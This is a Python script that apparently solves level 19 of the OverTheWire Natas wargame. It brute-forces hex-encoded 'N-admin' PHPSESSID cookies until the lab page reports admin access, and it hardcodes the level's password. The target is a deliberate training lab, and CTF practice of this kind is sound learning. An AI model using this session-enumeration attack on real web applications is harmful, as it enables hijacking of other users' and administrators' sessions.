#!/usr/bin/env python3

import requests
import re
import binascii

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' % username

for i in range(641):
	session = requests.Session()

	# print({ "PHPSESSID" : binascii.hexlify(str("%d-admin" % i))})
	print({ "PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex() })
	# response = requests.get(url, cookies = { "PHPSESSID": binascii.hexlify(b"%d-admin" % i) }, auth = (username, password))
	response = requests.get(url, cookies = { "PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex() }, auth = (username, password))

	if("You are an admin" in response.text):
		print("Got it", i)
		print(response.text)
		break
	# print(bytes.fromhex(session.cookies['PHPSESSID']).decode('utf-8'))